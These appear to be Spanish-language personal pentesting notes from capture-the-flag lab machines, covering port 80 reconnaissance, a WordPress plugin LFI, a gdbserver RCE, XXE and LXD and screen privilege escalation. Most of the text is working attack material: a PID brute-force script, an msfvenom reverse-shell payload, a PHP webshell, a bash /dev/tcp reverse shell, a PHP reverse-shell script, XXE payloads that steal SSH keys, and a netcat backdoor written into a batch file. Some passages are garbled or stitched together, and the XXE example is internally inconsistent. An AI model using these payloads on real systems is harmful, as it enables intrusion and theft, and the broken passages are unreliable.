📌 Es el puerto estándar del protocolo HTTP (HyperText Transfer Protocol).

    HTTP es el protocolo que permite la comunicación entre:

        🌐 Navegador (cliente)
        🖥️ Servidor web

❌ HTTP NO cifra la información.

    Eso significa que:

        Las credenciales pueden ser interceptadas.
        El tráfico puede ser modificado (Man-in-the-Middle).
        Se puede espiar el contenido.

    Por eso hoy en día casi todo usa HTTPS.

🧪 En auditoría / pentesting

    Si el puerto 80 está abierto, se revisa:

        Directorios ocultos
        Versiones del servidor (Apache, Nginx, IIS)
        Vulnerabilidades web (XSS, SQLi, SSTI…)
        Archivos sensibles expuestos

            ➡️ WordPress

                1. Enumerar los directorios a través de dirsearch. La ubicación predeterminada para los plugins en WordPress es: 

                        http://<IP_víctima>/wp-content/plugins

                    El estándar para este tipo de blogs es que contenga un fichero llamado "index.php" en blanco en la raíz del directorio /plugins. Si no está, se ha borrado, por lo que
                    seguiremos investigando otros directorios. 

                    En algunos casos hay ficheros readme.txt donde podemos ver información, entre ellas la versión del plugin. En el navegador buscaremos información sobre el publin para 
                    ver si hay algún exploit (ebook-download 1.1 wordpress plugin exploit).

                2. Después de hacer una búsqueda en el navegador, nos dicen que naveguemos a la siguiente ruta: 

                        http://<IP_víctima>/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php

                    Esto nos descarga el fichero wp-config.php. En dicho fichero nos encontramos la siguiente información valiosa: 

                        · DB_NAME
                        · DB_USER 
                        · DB_PASSWORD

                3. Interceptar peticiones a través de BurpSuite y lo enviamos a Repeater para poder leer el contenido del fichero más visual. Una vez en BurpSuite, intentaremos leer el 
                   fichero /etc/passwd (ya que tenemos la vulnerabilidad LFI) sustituyendo el contenido después de ebookdownloadurl=

                        /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd

                    Y esto nos devuelve varias rutas, como la del usuario:

                        user:x:1000:1000:user:/home/user:/bin/bash

                4. Se continua con el puerto 1337. Se puede encontrar información útil mediante un ataque de fuerza bruta al siguiente archivo: 

                        /proc/{PID}/cmdline

                    El archivo muestra el comando utilizado para ejecutar el proceso con el PID correspondiente (PID = ID del proceso). Para verlo, se ejcuta un nc -nvlp <PORT> y se 
                    reinicia el proceso en segundo plano pulsando la combinación Ctrl + Z. Usando el comando ps se verifican los PID de este proceso. Ahora se usa el comando anterior
                    con el PID correspondiente. 

                    Para hacer un ataque de fuerza bruta, con la petición anterior desde BurpSuite, enviaremos una solicitud para acceder al archivo "/proc/1/cmdline" y verificar sin 
                    la respuesta del servidor es la correcta. 

                    El contenido del archivo devuelto incluye el comando utilizado para ejecutar el proceso para el PID correspondiente. 

                5. Lanzar un ataque de fuerza bruta (Brute Forzin PID) con un script de python. 

                    El script repite el proceso de envío de la solicitud al archivo de destino y realiza una limpieza menor de la response para facilitar su comprensión. El rango de PID 
                    que usaremos será de 1 a 1000, ya que es un rango razonable para comenzar. 

                        import requests

                        for i in range(1, 1000):
                            r = requests.get("http://<IP>/wp-content/plugins/ebookdownload/filedownload.php?ebookdownloadurl=/proc/"+str(i)+"/cmdline")
                            out = (r.text.replace('/proc/'+str(i)+'/cmdline','').replace('<script>window.close()</script>','').replace('\00',' '))
                            
                            if len(out)>1:
                                print("PID"+str(i)+" : "+out)

                    Se encuentra un proceso que tenía un comando que hacía referencia al puerto 1337. El comando para este proceso indica que gdbserver se está ejecutando en el puerto 1337.

                        sh -c while true;do su user -c "cd /home/user; gdbserver -once 0.0.0.0:1337 /bin/true";done

                    GDB (GNU Project Debugger) es una herramienta de depuración que te ayuda a explorar tus programas mientras se ejecutan y también te permite ver qué sucede exactamente 
                    cuándo tu programa falla. gdbserver es un programa que permite ejecutar GDB en una máquina diferente a la que está ejecutando el programa que se está depurando.

                6. Buscar en Google exploits disponibles para gdbserver, encontramos esta vulnerabilidad de ejecución remota de código en la versión 9.2 de gdbserver. Siguiendo el exploit, 
                    primero genere el shellcode usando msfvenom: 

                        msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP_LOCAL> LPORT=4444 PrependFork=true -o rev.bin

                    Luego, iniciamos un listener con Netcat en el puerto 4444 (como se especifica en la variable LPORT de msfvenom) con el siguiente comando:
                    
                        nc -nvlp 4444

                    Y ahora ejecutamos el exploit con los siguientes parámetros. 

                        python3 gdb_rce.py <IP_víctima>:1337 rev.bin

                    Estabilizamos la terminal con el siguiente comando: 

                        python3 -c "import pty;pty.spawn('/bin/bash')"

                7. Realizar una escalada de privilegios
            
                    Enumeramos todos los procesos que se ejecutan en el sistema usando el comando ps auxww. 

                        find /var/run/screen/S-root -empty -exec screen -dmS root ;

                    Devuelve un proceso que crea una sesión screen dentro de un bucle do-while, el cual se ejecuta como root. screen es un multiplexor de terminal similar a tmux. Permite 
                    iniciar una sesión y abrir cualquier número de ventanas (terminales virtuales) dentro de ella. Los procesos que se ejecutan en Screen seguirán ejecutándose incluso cuando 
                    su ventana no esté visible e incluso si se desconecta. Al desconectar la sesión, el proceso que se inició originalmente desde la pantalla sigue ejecutándose y es gestionado 
                    por la propia pantalla. El proceso puede volver a conectar la sesión posteriormente, y los terminales siguen ahí, tal como estaban.

                    El comando screen -dmS root significa que se inicia una sesión de screen en modo separado y que esta sesión se denomina “root”. Al crear una nueva sesión de pantalla, se 
                    crea un directorio en /var/run/screen, llamado S-{username} (username es el nombre de usuario del usuario que la creó). Dentro de este directorio, se crea un archivo de 
                    sesión de pantalla con el nombre screen-session. Introducimos el siguiente comando: 

                        screen -S <user>

                    Por ejemplo, creemos una sesión de pantalla en nuestra máquina local con el usuario "dotguy" y el nombre de sesión “test_session”. Después de ejecutar el comando anterior,
                    introducimos el siguiente para seleccionar el tipo de terminal que queremos.

                        export TERM=xterm

                    Y lanzamos screen accediendo a un screen, previamente creado, del usuario root y cuyo nombre del screen es también root para conseguir escalar al mismo.

                        screen -x root/root

            ➡️ Descargar ficheros swap

                Este tipo de ficheros almacenan los cambios realizados en el búfer. Se crea debido a un fallo de la aplicación vim. Se puede leer de la siguiente manera: 

                    vim -r

                    string <nombreFileSwap> >> file.txt

                por ejemplo con admin y admin.

                Una vez capturada la llamada, enviamos a "send to Repeater" para poder modificar la request. Añadimos [] a las variables username y password después del nombre. Al 
                lanzar la petición, si devuelve 302, significará éxito en el login. 
                
                Si hay un recurso para subir ficheros, accedemos a él desde el navegador. Al ser un fichero php, hacemos el siguiente script: 

                    echo "<?php phpinfo(); ?>" > test.php

                Esto es para hacer una prueba. Una vez subido, si queremos comprobarlo, podemos hacerlo mediante la herramienta gobuster enumerando los directorios. Debería de salir 
                un directorio donde se almacenen los ficheros que se suban a través del directorio de upload. Se encontrará haciendo una enumeración de direcotorios. Si ha funcionado 
                correctamente, se va a crear un fichero que contenga la función system() y el parámetro cmd para poder ejecutar comandos. Se crea un nuevo fichero con el siguiente 
                código: 

                    <?php echo system($_REQUEST['cmd']);?>

                    echo “<?php echo system($_REQUEST['cmd']);?>” > webshell.php

                Ahora se realiza la misma acción que antes y se sube el fichero. Accedemos al fichero en la uri y al final, introducimos el parámetro ?cmd=id. Interceptaremos la petición

                teclas Ctrl + U): 

                    /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0>&1'

                    sudo nc -lvnp 443

                Como se ha visto, se ejecuta como usuario www-data. Este es un usuario predeterminado en sistemas de servidores web instalados. Al tener permisos de usuario, investigamos
                hasta ver algún archivo de configuración que nos pueda servir. 

                Si encontramos credenciales, podemos acceder mediante ssh.

    1️⃣1️⃣ Vulnerabilidades 

        ➡️ Directory Traversal o Local File Inclusion (LFI)

            Si vemos que en una url se añade ?file=home.php, estamos ante una vulnerabilidad de Directory Traversal y podemos usar la LFI. Añadiremos la siguiente ruta: 

                http://<IP>/?file=../../../../etc/passwd

            Nos devuelve info sobre root de linux. Si lo hacemos a travé sde BurpSuite, nos lo muestra más gráfico. Otra posibilidad de comprobarlo es con el comando curl.

            Si nos encontramos con tftp (que permite la subida y descarga de ficheros), como este ejemplo: 

                tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin

            El protocolo tftp se utiliza para la transferencia de archivos entre dispositivos. Usa UDP en lugar de TCP. Para enumerar, se usa el siguiente puerto: 

                69/udp open|filtered tftp
    
            El protocolo tftp no permite listar archivos, pero se puede descargar archivos comunes que suelen estar en servidores mal configurados. Se usará el siguiente 
            comando para comprobar si está instañado tftp y las opciones que podemos ejecutar.

                man tftp 

            Después de esto, se intenta hacer una reverse shell, modificando los valores IP (tun0) como el puerto (4444) del siguiente script en php. 

                <?php
                // PHP Reverse Shell
                $ip = '<IP_LOCAL>';  // ← Cambia esto por tu IP tun0 (HTB VPN)
                $port = <PORT>;   // ← Cambia esto por el puerto que usarás

                $sock = fsockopen($ip, $port);
                $proc = proc_open("/bin/sh", [
                0 => $sock,
                1 => $sock,
                2 => $sock
                ], $pipes);
                ?>

            Una vez modificado, se usa el siguiente comando para subirlo por tftp: 

                tftp <IP> -c put shell.php

            Para comprobarlo, se puede usar la herramienta Wireshark, donde se ven las peticiones que se hacen. 

            Una vez subido, en una terminal (siempre donde esté el fichero con el que estemos trabajando) ejecutamos un listener: 

                nc -lvnp <PORT>

            Mientras que en otra terminal, ejecutamos el siguiente comando: 

                curl 'http://{<IP>}/?file=/var/lib/tftpboot/shell.php'

            Con ese comando se ven los ficheros que se encuentran en esas ruta. Como no es interactiva, usaremos el siguiente comando para estabilizarla
            a Python. 

                python3 -c 'import pty;pty.spawn("/bin/bash")'

            Una vez que hemos accedido a esta ruta, vamos a realizar un Movimiento Lateral. Usamos ls -la para que nos liste los ficheros que pueda haber. Buscamos 
            en los ficheros que haya para ver si encontramos algún fichero interesante donde podamos encontrar la contraseña (ya que el usuario lo comprobamos cuando
            vimos la petición en BurpSuite).

            Una vez encontramos las credenciales, nos conectamos usando el siguiente comando en la terminal abierta. 

                su <user>

            Para escalar privilegios, lo primero que hay que hacer es comprobar a que grupo pertenece el usuario al que estamos conectados (LXD, ___ , etc.). Para ello usamos el siguiente 
            comando:

                id

            En primer lugar, en la máquina atacante (nuestra local) crearemos una imagen con acceso a root. Se usará la imagen Alpine Linux. Clonamos el repositorio en el directorio del 
            proyecto utilizando el siguiente comando.

                git clone https://github.com/saghul/lxd-alpine-builder.git

            Una vez creado, vamos al directorio donde hemos descargado el repositorio y ejecutamos el siguiente comando, que generará un arvhivo .tar.gz: 

                ./build.alpine

            Ahora subiremos la imagen mediante http. En un terminal nuevo (dentro del directorio donde se encuentra el archivo) introduciremos el siguiente comando con el puerto 8888 
            (se comprobará si está disponible con el comando sudo lsof -i :8888): 

                python3 -m http.server 8888

            Y ahora en la máquina donde nos habíamos conectado con el usuario, introducimos el siguiente comando para que suba el fichero: 

                 wget http://<IP_LOCAL>:8888/alpine-minirootfs-3.22.0-x86_64.tar.gz

            Una vez en la máquina víctima, se creará un directorio y extraemos en ese directorio el fichero.

                mkdir -p lxd-rootfs/rootfs

                tar -xzf ../alpine-minirootfs-3.22.0-x86_64.tar.gz -C rootfs

            Creamos el fichero metadata.yaml con el siguiente código: 

                cat <<EOF > metadata.yaml
                architecture: "x86_64"
                creation_date: $(date +%s)
                properties:
                description: "Alpine 3.22"
                os: "Alpine"
                release: "3.22"
                EOF

            Y una vez creado, el siguiente paso es crear el .tar.gz, con formato LXD válido. 

                tar -czf alpine-lxd.tar.gz metadata.yaml rootfs

            Y por último, importamos la imagen LXD desde un archivo válido. 

                lxc image import alpine-lxd.tar.gz --alias pwned

            Para continuar la escalada, usamos los siguientes comandos: 

                lxc init pwned esc -c security.privileged=true
                lxc config device add esc host-root disk source=/ path=/mnt/root recursive=true
                lxc start esc
                lxc exec esc /bin/sh

            Y ya podremos realizar cualquier acción de administrador.
        
        ➡️ XML External Entity injection (XXE)

            En Windows, para leer lo que en Linux sería /etc/passwd, en Windows es tal que así: 

                C:\windows\system32\drivers\etc\hosts

            Si nos encontramos con un formulario de pedidos, podemos realizar la petición con BurpSuite. Buscando por internet, añadiendo & delante de el item o producto, nos devuelve la 
            salida del archivo win.ini. 
            
                <?xml version = "1.0"?>
                    <!DOCTYPE root [<!ENTITY test SYSTEM 
                    'file:///c:/windows/win.ini'>]>

                    <data>&example;</data>

            Devuelve un listado con los directorios que tiene la máquina. Tenemos que ir investigando directorio por directorio para averiguar alguna información que nos pueda servir de 
            ayuda. 

            Si encontramos el directorio .ssh, podríamos recuperar la clave privada. Para ello sustituimos este código en BurpSuite: 

                <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/<USER>/.ssh/id_rsa'>]>  (WINDOWS)
                <!DOCTYPE root [<!ENTITY test SYSTEM 'file:////home/user/.ssh/id_rsa'>]>  (LINUX)

            Devuelve una clave RSA, que se guardará en un fichero local (id_rsa, por ejemplo). En el directorio donde se encuentra el proyecto, ejecutaremos los siguientes comandos: 

                mkdir rsa

                touch id_rsa

                vim id_rsa (copiarlo empezando con -----BEGIN OPENSSH PRIVATE KEY----- y terminando con -----END OPENSSH PRIVATE KEY-----)

                chmod 400 id_rsa (400 son permisos de solo de lectura)

            Una vez realizados estos comandos, nos conectamos vía ssh: 

                ssh -i id_rsa <USER>@<IP>

            Ya estaremos conectados al usuario. Para acceder a permisos de administrador, hay que hacer una escalada de privilegios. Comprobamos los privilegios actuales con el siguiente 
            comando: 

                whoami /priv

            No tiene privilegios especiales, por lo que hay que navegar para encontrar algo que nos pueda ayudar. Se encuentra un archivo llamado job.bat, el cual intentamos ejecutar: 

                icacls job.bat (Busca la ubicación del fichero → where /r C:\ job.bat)

            Nos dice que el grupo BUILTIN/Users tiene el control total (F) sobre el fichero. Ya que la máquina no tiene acceso a internet, hay que subir el fichero nc64.exe. Descargamos 
            el ejecutable en nuestro local y donde tengamos el ejecutable descargado, ejecutamos en una terminal (desde la máquina atacante) el listener:

                sudo python -m http.server 80

            Desde la terminal Windows del usuario, usamos el siguiente comando para poner la terminal en PowerShell: 
            
                powershell

            Una vez esté la terminal en powershell, introducimos el siguiente comando para subirlo: 

                wget http://<IP_LOCAL>/nc64.exe -outfile nc64.exe 

            Salimos de la powershell escribiento exit y modificaremos el script usando el siguiente comando. Hay que hacerlo desde la terminal de Windows. 

                echo C:\Log-Management\nc64.exe -e cmd.exe <IP_LOCAL> 8888 > C:\Log-Management\job.bat

            Antes de ejecutarlo, abrimos una nueva terminal y ejecutamos el netcat:

                sudo nc -lvnp 8888

            Y entraremos como administrador.
